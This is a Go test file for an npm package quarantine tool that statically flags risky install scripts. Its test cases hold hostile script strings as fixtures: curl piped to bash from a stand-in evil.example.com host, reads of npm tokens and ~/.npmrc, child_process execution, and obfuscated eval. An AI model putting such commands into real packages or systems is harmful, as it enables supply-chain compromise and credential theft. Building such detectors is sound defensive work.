package quarantine

import (
	"bytes"
	"context"
	"encoding/json"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aniklavida/installgate/internal/evidence"
)

func TestInspectLimits_Validation(t *testing.T) {
	valid := DefaultInspectLimits()
	if err := valid.Validate(); err != nil {
		t.Fatalf("valid limits failed validation: %v", err)
	}

	testCases := []struct {
		name   string
		mutate func(*InspectLimits)
	}{
		{"ZeroMaxScriptBytes", func(l *InspectLimits) { l.MaxScriptBytes = 0 }},
		{"ZeroMaxScriptCount", func(l *InspectLimits) { l.MaxScriptCount = 0 }},
		{"ZeroMaxPackageJSONBytes", func(l *InspectLimits) { l.MaxPackageJSONBytes = 0 }},
		{"ZeroMaxFilesScanned", func(l *InspectLimits) { l.MaxFilesScanned = 0 }},
		{"ZeroMaxFileReadBytes", func(l *InspectLimits) { l.MaxFileReadBytes = 0 }},
		{"ZeroTimeout", func(l *InspectLimits) { l.Timeout = 0 }},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			limits := DefaultInspectLimits()
			tc.mutate(&limits)
			if err := limits.Validate(); err == nil {
				t.Errorf("expected validation error for %s, got nil", tc.name)
			}
		})
	}
}

func TestInspectLimits_NamedConstants(t *testing.T) {
	limits := DefaultInspectLimits()
	if limits.MaxScriptBytes != DefaultMaxScriptBytes {
		t.Errorf("MaxScriptBytes = %d, want %d", limits.MaxScriptBytes, DefaultMaxScriptBytes)
	}
	if limits.MaxScriptCount != DefaultMaxScriptCount {
		t.Errorf("MaxScriptCount = %d, want %d", limits.MaxScriptCount, DefaultMaxScriptCount)
	}
	if limits.MaxPackageJSONBytes != DefaultMaxPackageJSONBytes {
		t.Errorf("MaxPackageJSONBytes = %d, want %d", limits.MaxPackageJSONBytes, DefaultMaxPackageJSONBytes)
	}
	if limits.MaxFilesScanned != DefaultMaxFilesScanned {
		t.Errorf("MaxFilesScanned = %d, want %d", limits.MaxFilesScanned, DefaultMaxFilesScanned)
	}
	if limits.MaxFileReadBytes != DefaultMaxFileReadBytes {
		t.Errorf("MaxFileReadBytes = %d, want %d", limits.MaxFileReadBytes, DefaultMaxFileReadBytes)
	}
	if limits.Timeout != DefaultInspectTimeout {
		t.Errorf("Timeout = %v, want %v", limits.Timeout, DefaultInspectTimeout)
	}
}

func TestInspectScripts_ApprovedSurfacesOnly(t *testing.T) {
	pkgJSON := []byte(`{
		"name": "approved-surfaces-test",
		"version": "1.0.0",
		"scripts": {
			"preinstall": "node setup-pre.js",
			"install": "node setup-inst.js",
			"postinstall": "node setup-post.js",
			"prepare": "node setup-prep.js",
			"test": "jest",
			"start": "node index.js",
			"build": "tsc",
			"lint": "eslint ."
		}
	}`)

	tarball := createTestTarball(t, map[string][]byte{
		"package/package.json": pkgJSON,
		"package/index.js":     []byte("module.exports = {};\n"),
	}, nil)

	res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), DefaultInspectLimits(), nil)
	if err != nil {
		t.Fatalf("InspectScripts failed: %v", err)
	}

	if !res.HasInstallScript {
		t.Error("expected HasInstallScript = true")
	}

	// Only preinstall, install, postinstall, prepare must be recorded
	expected := map[string]bool{
		"preinstall":  true,
		"install":     true,
		"postinstall": true,
		"prepare":     true,
	}

	for _, s := range res.InstallScripts {
		if !expected[s] {
			t.Errorf("unexpected script %q in InstallScripts", s)
		}
	}
	if len(res.InstallScripts) != 4 {
		t.Errorf("expected 4 lifecycle scripts, got %d: %v", len(res.InstallScripts), res.InstallScripts)
	}

	// Verify unapproved scripts (test, start, build, lint) are not in signals
	for _, sig := range res.Signals {
		for _, forbidden := range []string{"test", "start", "build", "lint"} {
			if sig.Observation == "lifecycle_script:"+forbidden {
				t.Errorf("forbidden script %q emitted in observation", forbidden)
			}
		}
	}
}

func TestInspectScripts_NativeBuild(t *testing.T) {
	t.Run("BindingGypFile", func(t *testing.T) {
		tarball := createTestTarball(t, map[string][]byte{
			"package/package.json": []byte(`{"name":"native-pkg","version":"1.0.0"}`),
			"package/binding.gyp":  []byte(`{ "targets": [] }`),
		}, nil)

		res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), DefaultInspectLimits(), nil)
		if err != nil {
			t.Fatalf("InspectScripts failed: %v", err)
		}
		if !res.HasNativeBuild {
			t.Error("expected HasNativeBuild = true for binding.gyp")
		}
	})

	t.Run("GypfileField", func(t *testing.T) {
		tarball := createTestTarball(t, map[string][]byte{
			"package/package.json": []byte(`{"name":"native-pkg","version":"1.0.0","gypfile":true}`),
		}, nil)

		res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), DefaultInspectLimits(), nil)
		if err != nil {
			t.Fatalf("InspectScripts failed: %v", err)
		}
		if !res.HasNativeBuild {
			t.Error("expected HasNativeBuild = true for gypfile: true")
		}
	})
}

func TestInspectScripts_DiffDetection(t *testing.T) {
	prevPkgJSON := []byte(`{
		"name": "diff-pkg",
		"version": "1.0.0",
		"scripts": {
			"install": "node compile.js"
		}
	}`)

	currPkgJSON := []byte(`{
		"name": "diff-pkg",
		"version": "1.1.0",
		"scripts": {
			"install": "node compile.js",
			"postinstall": "node telemetry.js"
		}
	}`)

	tarball := createTestTarball(t, map[string][]byte{
		"package/package.json": currPkgJSON,
	}, nil)

	res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), DefaultInspectLimits(), prevPkgJSON)
	if err != nil {
		t.Fatalf("InspectScripts failed: %v", err)
	}

	var hasNewPostinstall, hasScriptAdded bool
	for _, sig := range res.Signals {
		if sig.Observation == "new_lifecycle_script:postinstall" {
			hasNewPostinstall = true
		}
		if sig.Observation == "script_added" {
			hasScriptAdded = true
		}
		if sig.Observation == "new_lifecycle_script:install" {
			t.Errorf("install was present in previous version, should not be marked new")
		}
	}

	if !hasNewPostinstall {
		t.Error("expected new_lifecycle_script:postinstall observation")
	}
	if !hasScriptAdded {
		t.Error("expected script_added observation")
	}
}

func TestInspectScripts_FocusedThreatIndicators(t *testing.T) {
	testCases := []struct {
		name              string
		script            string
		expectedIndicator string
	}{
		{
			name:              "ProcessExecution_ChildProcess",
			script:            "node -e \"require('child_process').execSync('whoami')\"",
			expectedIndicator: "indicator:process_execution:script:postinstall",
		},
		{
			name:              "ProcessExecution_ShellInvocation",
			script:            "sh -c 'echo pwned'",
			expectedIndicator: "indicator:process_execution:script:postinstall",
		},
		{
			name:              "NetworkAccess_Curl",
			script:            "curl -s https://example.com/checkin",
			expectedIndicator: "indicator:network_access:script:postinstall",
		},
		{
			name:              "NetworkAccess_Wget",
			script:            "wget -q http://example.com/asset",
			expectedIndicator: "indicator:network_access:script:postinstall",
		},
		{
			name:              "StagedPayload_PipeToSh",
			script:            "curl -s https://example.com/payload.sh | bash",
			expectedIndicator: "indicator:staged_payload:script:postinstall",
		},
		{
			name:              "CredentialRead_EnvToken",
			script:            "node -e \"const token = process.env.npm_token; send(token);\"",
			expectedIndicator: "indicator:credential_read:script:postinstall",
		},
		{
			name:              "CredentialRead_Npmrc",
			script:            "cat ~/.npmrc | grep authtoken",
			expectedIndicator: "indicator:credential_read:script:postinstall",
		},
		{
			name:              "Obfuscation_HexEscapes",
			script:            "\\x72\\x65\\x71\\x75\\x69\\x72\\x65('child_process')",
			expectedIndicator: "indicator:obfuscation:script:postinstall",
		},
		{
			name:              "Obfuscation_EvalFunction",
			script:            "eval(String.fromCharCode(97, 108, 101, 114, 116))",
			expectedIndicator: "indicator:obfuscation:script:postinstall",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			pkgJSON, err := json.Marshal(map[string]interface{}{
				"name":    "threat-pkg",
				"version": "1.0.0",
				"scripts": map[string]string{
					"postinstall": tc.script,
				},
			})
			if err != nil {
				t.Fatalf("failed marshaling pkgJSON: %v", err)
			}

			tarball := createTestTarball(t, map[string][]byte{
				"package/package.json": pkgJSON,
			}, nil)

			res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), DefaultInspectLimits(), nil)
			if err != nil {
				t.Fatalf("InspectScripts failed: %v", err)
			}

			if len(res.DangerousScripts) == 0 || res.DangerousScripts[0] != "postinstall" {
				t.Errorf("expected DangerousScripts to include 'postinstall', got: %v", res.DangerousScripts)
			}

			found := false
			for _, sig := range res.Signals {
				if sig.Observation == tc.expectedIndicator {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected indicator observation %q, got: %+v", tc.expectedIndicator, res.Signals)
			}
		})
	}
}

func TestInspectScripts_LimitsProduceDegradedObservation(t *testing.T) {
	t.Run("PackageJSONExceedsLimit", func(t *testing.T) {
		// Create a large package.json
		bigPkg := `{"name":"big-pkg","version":"1.0.0","description":"` + strings.Repeat("A", 2000) + `"}`
		tarball := createTestTarball(t, map[string][]byte{
			"package/package.json": []byte(bigPkg),
		}, nil)

		limits := DefaultInspectLimits()
		limits.MaxPackageJSONBytes = 500 // smaller than bigPkg

		res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), limits, nil)
		if err != nil {
			t.Fatalf("InspectScripts failed: %v", err)
		}

		if !res.Truncated {
			t.Error("expected Truncated = true when package.json exceeds limit")
		}

		// Assert degraded observation is emitted
		var foundDegraded bool
		for _, sig := range res.Signals {
			if sig.Observation == "inspect_truncated" && sig.Confidence == evidence.ConfidenceNone {
				foundDegraded = true
				break
			}
		}
		if !foundDegraded {
			t.Errorf("expected degraded observation 'inspect_truncated' with ConfidenceNone, got: %+v", res.Signals)
		}
	})

	t.Run("ScriptValueExceedsLimit", func(t *testing.T) {
		longCmd := "node " + strings.Repeat("x", 500)
		pkgJSON := `{"name":"pkg","version":"1.0.0","scripts":{"postinstall":"` + longCmd + `"}}`
		tarball := createTestTarball(t, map[string][]byte{
			"package/package.json": []byte(pkgJSON),
		}, nil)

		limits := DefaultInspectLimits()
		limits.MaxScriptBytes = 100 // smaller than longCmd

		res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), limits, nil)
		if err != nil {
			t.Fatalf("InspectScripts failed: %v", err)
		}

		if !res.Truncated {
			t.Error("expected Truncated = true when script exceeds limit")
		}

		var foundDegraded bool
		for _, sig := range res.Signals {
			if sig.Observation == "inspect_truncated" && sig.Confidence == evidence.ConfidenceNone {
				foundDegraded = true
				break
			}
		}
		if !foundDegraded {
			t.Errorf("expected degraded observation 'inspect_truncated', got: %+v", res.Signals)
		}
	})
}

func TestInspectScripts_NoSubprocessOrShellExecution(t *testing.T) {
	// 1. AST check: ensure os/exec and syscall are never imported by quarantine production code
	quarantineFiles := []string{
		"archive.go",
		"inspect.go",
		"manager.go",
		"blobstore.go",
		"digest.go",
		"metadata.go",
	}

	fset := token.NewFileSet()
	for _, fName := range quarantineFiles {
		node, err := parser.ParseFile(fset, fName, nil, parser.ImportsOnly)
		if err != nil {
			t.Fatalf("failed parsing %s: %v", fName, err)
		}
		for _, imp := range node.Imports {
			pathVal := strings.Trim(imp.Path.Value, `"`)
			if pathVal == "os/exec" || pathVal == "syscall" || strings.HasPrefix(pathVal, "golang.org/x/sys") {
				t.Fatalf("VIOLATION: production code in %s imports prohibited package %q", fName, pathVal)
			}
		}
	}

	// 2. Execution assertion: tarball with shell commands attempting to write a marker file
	tempDir := t.TempDir()
	markerFile := filepath.Join(tempDir, "should_not_exist.marker")

	maliciousPkgJSON, err := json.Marshal(map[string]interface{}{
		"name":    "malicious-pkg",
		"version": "1.0.0",
		"scripts": map[string]string{
			"preinstall":  "sh -c 'touch " + markerFile + "'",
			"postinstall": "curl -s https://evil.example.com/payload.sh | bash",
		},
	})
	if err != nil {
		t.Fatalf("failed marshaling maliciousPkgJSON: %v", err)
	}

	tarball := createTestTarball(t, map[string][]byte{
		"package/package.json": maliciousPkgJSON,
	}, nil)

	res, err := InspectScripts(context.Background(), bytes.NewReader(tarball), DefaultArchiveLimits(), DefaultInspectLimits(), nil)
	if err != nil {
		t.Fatalf("InspectScripts failed: %v", err)
	}

	// Verify the marker file was never created
	if _, err := os.Stat(markerFile); !os.IsNotExist(err) {
		t.Fatalf("SECURITY FAILURE: package code executed during inspection! %s exists", markerFile)
	}

	// Verify inspection safely detected the scripts via pure pattern matching
	if len(res.DangerousScripts) == 0 {
		t.Error("expected dangerous scripts to be detected statically")
	}
}
